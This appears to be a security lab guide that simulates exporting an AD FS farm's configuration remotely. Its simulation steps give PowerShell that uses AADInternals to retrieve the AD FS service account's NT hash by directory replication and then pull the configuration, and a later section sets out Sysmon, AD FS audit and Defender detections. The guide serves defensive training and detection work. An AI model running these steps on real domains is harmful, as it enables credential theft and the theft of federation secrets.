# Export AD FS Configuration via Policy Store Transfer Service

Based on [recent research](https://o365blog.com/post/adfs/) by [Dr. Nestori Syynimaa](https://twitter.com/DrAzureAD), a threat actor could use [AD FS synchronization (Replication services)](https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-the-ad-fs-configuration-database#how-the-adfs-configuration-database-is-synchronized) and pretend to be a secondary federation server to retrieve the AD FS configuration settings remotely from the primary federation server. 

Legitimate secondary federation servers store a `read-only` copy of the AD FS configuration database and connect to and synchronize the data with the primary federation server in the AD FS farm by polling it at regular intervals to check whether data has changed. A threat actor could use `SOAP messages` (XML documents) to request/sync AD FS configuration settings over a Windows Communication Foundation (WFC) service named `Policy Store transfer Service` on the federation primary server. This service can be accessed via the following URL over HTTP: 
 
```
http://<AD FS Server Name>:80/adfs/services/policystoretransfer
```

## Table of Contents

* [Preconditions](#preconditions)
* [Simulation Steps](#simulation-steps)
* [Detection](#detection)
* [Output](#output)
* [References](#references)

## Preconditions

* Integrity level: medium
* Authorization:
    * Resource: AD FS Database 
    * Identity:
        * AD FS Service Account
        * Local Administrator
* AD FS Server
    * Services:
        * Active Directory Federation Services (ADFSSRV)
    * Network:
        * URL: `http://<adfs server name>:80/adfs/services/policystoretransfer`
        * Port: 80

## Simulation Steps

For this remote variation, we can use use [AADInternals](https://github.com/Gerenios/AADInternals) with the following information:
* IP Address or FQDN of the AD FS server
* NTHash of the AD FS service account
* SID of the AD FS service account 

### Log onto a domain joined workstation

1.  Connect to one of the domain joined workstations in the network via the [Azure Bastion service](../../../../environments/_helper-docs/connectAzVmAzBastion.md) as a [domain admin account](https://github.com/Azure/SimuLand/tree/main/2_deploy/aadHybridIdentityADFS#domain-users-information) (e.g. pgustavo).

### Get Object GUID and SID of the AD FS Service Account

2.  Open PowerShell as Administrator
3.  Use the [Active Directory Service Interfaces (ADSI)](https://docs.microsoft.com/en-us/windows/win32/adsi/active-directory-service-interfaces-adsi) to search for the AD FS service account object in the domain controller. Make sure you use the name of the `AD FS service account` you created for the lab environment (e.g. adfsadmin).

```PowerShell
$AdfsServiceAccount = 'adfsadmin'
$AdfsAdmin = ([adsisearcher]"(&(ObjectClass=user)(samaccountname=$AdfsServiceAccount))").FindOne() 
$Object = New-Object PSObject -Property @{ 
    Samaccountname = ($AdfsAdmin.Properties).samaccountname 
    ObjectGuid  = ([guid]($AdfsAdmin.Properties).objectguid[0]).guid 
    ObjectSid   = (new-object System.Security.Principal.SecurityIdentifier ($AdfsAdmin.Properties).objectsid[0],0).Value 
}
$Object | Format-List
```

![](../../../../images/labs/goldemsaml/exportADFSTokenSigningCertificate/2021-05-19_05_get_adfs_service_account.png)

### Install AADInternals

4.  On the same elevated PowerShell session, run the following commands to install [AADInternals](https://github.com/Gerenios/AADInternals) if it is not installed yet: 

```PowerShell
Install-Module –Name AADInternals -Force 
Import-Module –Name AADInternals 
```

### Get NTHash of AD FS Service Account via Directory Replication Services (DSR)

5. Get the NTHash of the AD FS service account. AADInternals accomplishes this via [Active Directory Replication Services (DRS)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/06205d97-30da-4fdc-a276-3fd831b272e0#:~:text=The%20Directory%20Replication%20Service%20%28DRS%29%20Remote%20Protocol%20is,name%20of%20each%20dsaop%20method%20begins%20with%20%22IDL_DSA%22.) with the [Get-AADIntADUserNTHash](https://github.com/Gerenios/AADInternals/blob/master/DRS_Utils.ps1#L71) function. Make sure you set the right name for the domain controller in your environment (`$Server`).

```PowerShell
$Server = 'DC01.simulandlabs.com'
$creds = Get-Credential

$NTHash = Get-AADIntADUserNTHash –ObjectGuid $Object.ObjectGuid –Credentials $creds –Server $Server -AsHex
$NTHash
```

![](../../../../images/labs/goldemsaml/exportADFSTokenSigningCertificate/2021-05-19_06_get_adfs_service_account_nthash.png)

### Get AD FS Configuration Settings Remotely

6.  Finally, we can use all the previous information to export the AD FS configuration settings remotely. Make sure you set the right name for the AD FS server in your environment (`$ADFSServer`).

```PowerShell
$ADFSServer = "ADFS01.simulandlabs.com" 
$settings = Export-AADIntADFSConfiguration -Hash $NTHash -SID $Object.ObjectSid -Server $ADFSServer
$settings 
```

![](../../../../images/labs/goldemsaml/exportADFSTokenSigningCertificate/2021-05-19_07_get_adfs_settings_remotely.png)

## Detection

### Detect AD FS Remote Synchronization Network Connection

The replication channel used to connect to the AD FS server is over `port 80`. Therefore, we can monitor for incoming network traffic to the AD FS server over HTTP with `Sysmon event id 3 (NetworkConnect)`. For an environment with only one server in the AD FS farm, it is rare to see incoming connections over standard HTTP port from workstations in the network.

![](../../../../images/labs/goldemsaml/exportADFSTokenSigningCertificate/2021-05-19_08_adfs_remote_connection_sysmon.png)

Another behavior that we could monitor is the `authorization check` enforced by the AD FS replication service on the main federation server. We can use security events `412` and `501` from the `AD FS auditing` event provider to capture this behavior. These two events can be joined on the `Instance ID` value for additional context and to filter out other authentication events.

![](../../../../images/labs/goldemsaml/exportADFSTokenSigningCertificate/2021-05-19_09_adfs_remote_connection_adfsauditing.png)

#### Azure Sentinel Detection Rules

* [AD FS Remote HTTP Network Connection](https://github.com/Azure/Azure-Sentinel/blob/master/Detections/SecurityEvent/ADFSRemoteHTTPNetworkConnection.yaml)
* [AD FS Remote Auth Sync Connection](https://github.com/Azure/Azure-Sentinel/blob/master/Detections/SecurityEvent/ADFSRemoteAuthSyncConnection.yaml)

### Detect Active Directory Replication Services

Even though the use of directory replication services (DRS) is not part of the core behavior to extract the AD FS configuration settings remotely, it is an additional step taken by tools such as [AADInternals](https://github.com/Gerenios/AADInternals) to get the NTHash of the AD FS user account to access the AD FS database remotely.

#### Microsoft Defender for Identity Alerts

**Suspected DCSync attack (replication of directory services)**

The Microsoft Defender for Identity (MDI) sensor, installed on the domain controller, triggers an alert when this occurs. MDI detects non-domain controllers using Directory Replication Services (DRS) to sync information from the domain controller. 

1.  Navigate to [Microsoft 365 Security Center](https://security.microsoft.com/).
2.  Go to `More Resources` and click on `Azure Advanced Threat Protection`. 

![](../../../../images/labs/goldemsaml/exportADFSTokenSigningCertificate/2021-05-19_10_m365_mdi_alert_dcsync.png)

#### Microsoft Cloud Application Security Alerts

**Suspected DCSync attack (replication of directory services)**

You can also see the same alert in the Microsoft Cloud Application Security (MCAS) portal. The MCAS portal is considered the new investigation experience for MDI.

1.	Navigate to [Microsoft 365 Security Center](https://security.microsoft.com/)
2.	Go to “More Resources” and click on “[Microsoft Cloud App Security](https://portal.cloudappsecurity.com/)”.

![](../../../../images/labs/goldemsaml/exportADFSTokenSigningCertificate/2021-05-19_11_m365_mcas_alert_dcsync.png)

## Output

* AD FS Configuration Settings

## References

* [Exporting ADFS certificates revisited: Tactics, Techniques and Procedures (o365blog.com)](https://o365blog.com/post/adfs/)
* [The Role of the AD FS Configuration Database | Microsoft Docs](https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-the-ad-fs-configuration-database)
* [Create a server audit and database audit specification](https://docs.microsoft.com/en-us/sql/relational-databases/security/auditing/create-a-server-audit-and-database-audit-specification?view=sql-server-ver15)
* [SQL Server Audit Action Groups and Actions](https://docs.microsoft.com/en-us/sql/relational-databases/security/auditing/sql-server-audit-action-groups-and-actions?view=sql-server-ver15)